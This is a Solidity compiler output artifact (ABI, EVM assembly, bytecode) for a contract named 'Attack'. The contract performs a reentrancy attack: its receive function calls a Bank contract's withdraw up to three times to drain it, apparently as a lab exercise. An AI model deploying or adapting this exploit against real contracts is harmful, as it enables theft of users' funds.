{
	"attack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_bankAddr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "depositBank",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getContractBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "startAttack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"attack.sol\":316:929  contract Attack{\r... */\n  mstore(0x40, 0x80)\n    /* \"attack.sol\":407:485  constructor(address _bankAddr) public{\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"attack.sol\":467:476  _bankAddr */\n  dup1\n    /* \"attack.sol\":455:459  bank */\n  0x01\n  0x00\n    /* \"attack.sol\":455:477  bank = Bank(_bankAddr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"attack.sol\":407:485  constructor(address _bankAddr) public{\r... */\n  pop\n    /* \"attack.sol\":316:929  contract Attack{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"attack.sol\":316:929  contract Attack{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6f9fb98a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x76bd4220\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x77c00de0\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"attack.sol\":538:539  3 */\n      0x03\n        /* \"attack.sol\":534:535  i */\n      dup1\n      sload\n        /* \"attack.sol\":534:539  i < 3 */\n      lt\n        /* \"attack.sol\":531:610  if(i < 3){\r... */\n      iszero\n      tag_8\n      jumpi\n        /* \"attack.sol\":555:556  i */\n      0x03\n      0x00\n        /* \"attack.sol\":555:558  i++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      0x01\n      add\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"attack.sol\":573:577  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attack.sol\":573:586  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"attack.sol\":587:597  sentAmount */\n      sload(0x02)\n        /* \"attack.sol\":573:598  bank.withdraw(sentAmount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n        /* \"attack.sol\":531:610  if(i < 3){\r... */\n    tag_8:\n        /* \"attack.sol\":316:929  contract Attack{\r... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"attack.sol\":625:729  function getContractBalance() external view returns(uint){\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"attack.sol\":737:842  function depositBank() external payable{\r... */\n    tag_4:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"attack.sol\":850:926  function startAttack() external {\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"attack.sol\":625:729  function getContractBalance() external view returns(uint){\r... */\n    tag_14:\n        /* \"attack.sol\":677:681  uint */\n      0x00\n        /* \"attack.sol\":700:721  address(this).balance */\n      selfbalance\n        /* \"attack.sol\":693:721  return address(this).balance */\n      swap1\n      pop\n        /* \"attack.sol\":625:729  function getContractBalance() external view returns(uint){\r... */\n      swap1\n      jump\t// out\n        /* \"attack.sol\":737:842  function depositBank() external payable{\r... */\n    tag_16:\n        /* \"attack.sol\":800:809  msg.value */\n      callvalue\n        /* \"attack.sol\":787:797  sentAmount */\n      0x02\n        /* \"attack.sol\":787:809  sentAmount = msg.value */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"attack.sol\":820:824  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attack.sol\":820:832  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"attack.sol\":820:834  bank.deposit() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n        /* \"attack.sol\":737:842  function depositBank() external payable{\r... */\n      jump\t// out\n        /* \"attack.sol\":850:926  function startAttack() external {\r... */\n    tag_19:\n        /* \"attack.sol\":893:897  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attack.sol\":893:906  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"attack.sol\":907:917  sentAmount */\n      sload(0x02)\n        /* \"attack.sol\":893:918  bank.withdraw(sentAmount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_28:\n      pop\n      pop\n      pop\n      pop\n        /* \"attack.sol\":850:926  function startAttack() external {\r... */\n      jump\t// out\n\n    auxdata: 0xa264697066735822122055776dbbb68aa8215d06e2a26bd3522cb99883d26dc9b946a980b5bd74d4d63564736f6c63430007050033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405161032b38038061032b8339818101604052602081101561003357600080fd5b810190808051906020019092919050505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610296806100956000396000f3fe6080604052600436106100385760003560e01c80636f9fb98a146100f057806376bd42201461011b57806377c00de014610125576100eb565b366100eb576003805410156100e957600360008154809291906001019190505550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6002546040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100d057600080fd5b505af11580156100e4573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100fc57600080fd5b5061010561013c565b6040518082815260200191505060405180910390f35b610123610144565b005b34801561013157600080fd5b5061013a6101cf565b005b600047905090565b34600281905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db06040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101b557600080fd5b505af11580156101c9573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6002546040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561024657600080fd5b505af115801561025a573d6000803e3d6000fd5b5050505056fea264697066735822122055776dbbb68aa8215d06e2a26bd3522cb99883d26dc9b946a980b5bd74d4d63564736f6c63430007050033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x32B CODESIZE SUB DUP1 PUSH2 0x32B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x296 DUP1 PUSH2 0x95 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6F9FB98A EQ PUSH2 0xF0 JUMPI DUP1 PUSH4 0x76BD4220 EQ PUSH2 0x11B JUMPI DUP1 PUSH4 0x77C00DE0 EQ PUSH2 0x125 JUMPI PUSH2 0xEB JUMP JUMPDEST CALLDATASIZE PUSH2 0xEB JUMPI PUSH1 0x3 DUP1 SLOAD LT ISZERO PUSH2 0xE9 JUMPI PUSH1 0x3 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x105 PUSH2 0x13C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x123 PUSH2 0x144 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x131 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x13A PUSH2 0x1CF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST CALLVALUE PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x246 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x25A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SSTORE PUSH24 0x6DBBB68AA8215D06E2A26BD3522CB99883D26DC9B946A980 0xB5 0xBD PUSH21 0xD4D63564736F6C6343000705003300000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "132400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"depositBank()": "infinite",
						"getContractBalance()": "193",
						"startAttack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"depositBank()": "76bd4220",
					"getContractBalance()": "6f9fb98a",
					"startAttack()": "77c00de0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 23,
						"contract": "attack.sol:Attack",
						"label": "jiji",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(oioi)21"
					},
					{
						"astId": 25,
						"contract": "attack.sol:Attack",
						"label": "bank",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Bank)20"
					},
					{
						"astId": 27,
						"contract": "attack.sol:Attack",
						"label": "sentAmount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 29,
						"contract": "attack.sol:Attack",
						"label": "i",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(Bank)20": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					},
					"t_contract(oioi)21": {
						"encoding": "inplace",
						"label": "contract oioi",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}